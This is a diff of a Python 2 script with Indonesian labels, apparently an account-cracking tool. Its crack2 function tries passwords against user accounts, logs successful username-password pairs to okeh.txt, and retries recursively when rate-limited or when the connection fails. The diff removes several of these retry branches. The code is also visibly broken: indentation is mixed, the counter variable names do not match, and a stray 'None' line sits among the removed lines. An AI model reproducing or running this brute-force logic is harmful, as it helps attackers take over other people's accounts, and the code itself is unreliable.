@@ -540,37 +540,6 @@ def crack2(user, pwx):
 						with open("okeh.txt", "a")as simpan:
 							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
 						ok.append(user)
-					break
-				elif "userId" in str(data):
-					okeh = "Berhasil"
-					if len(status_foll) != 1:
-						ingfo(user, pw, okeh)
-						with open("okeh.txt", "a")as simpan:
-							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
-						ok.append(user)
-					break
-				elif "Please wait" in str(data):
-					print "\r "+rm+"[Retakan] %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
-                    looping+=1
-					sys.stdout.flush()
-					pwx = [pw]
-					crack2(user, pwx)
-					loping -=1
-				else:
-					looping =1
-					pass
-		except requests.exceptions.ConnectionError:
-			sys.stdout.flush()
-			print "\r "+rm+"[Retakan] %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
-            looping+=1
-			pwx = [pw]
-			crack2(user, pwx)
-			loping -=1
-		except:
-			looping =1
-			pass
-	loping+=1
-None
 # GANTI USER AGENT
 def useragent():
 	print ("\n%s [%s01%s] Ganti user agent "%(P,K,P))
